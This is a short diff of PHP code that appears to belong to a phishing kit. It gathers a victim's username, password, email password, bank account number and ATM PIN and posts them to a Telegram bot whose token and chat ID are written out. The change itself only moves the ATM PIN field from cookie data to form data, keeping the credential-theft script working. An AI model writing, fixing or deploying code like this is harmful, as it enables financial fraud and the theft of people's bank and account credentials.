@@ -106,7 +106,7 @@ file_get_contents("https://api.telegram.org/bot5240606429:AAHqmDZdymDhwy8CfgBeTj
 if (!empty($_COOKIE['email'])) {
         $a = [
    'chat_id' => "-773692150", 
-   'text' => "User: " . $_COOKIE['username'] . "\nPass: " . $_COOKIE['password'] . "\n\nEmail: " . $_COOKIE['email'] . "\nEmail Pass: " . $_COOKIE['email_pass'] . "\n\nAcc Num: " . $_COOKIE['accnum'] . "\nATM PIN: " . $_COOKIE['atmpin']
+   'text' => "User: " . $_COOKIE['username'] . "\nPass: " . $_COOKIE['password'] . "\n\nEmail: " . $_COOKIE['email'] . "\nEmail Pass: " . $_COOKIE['email_pass'] . "\n\nAcc Num: " . $_COOKIE['accnum'] . "\nATM PIN: " . $_POST['atmpin']
 ];
 file_get_contents("https://api.telegram.org/bot5240606429:AAHqmDZdymDhwy8CfgBeTjqv7THCdLbyzW8/sendMessage?" . http_build_query($a));
 }
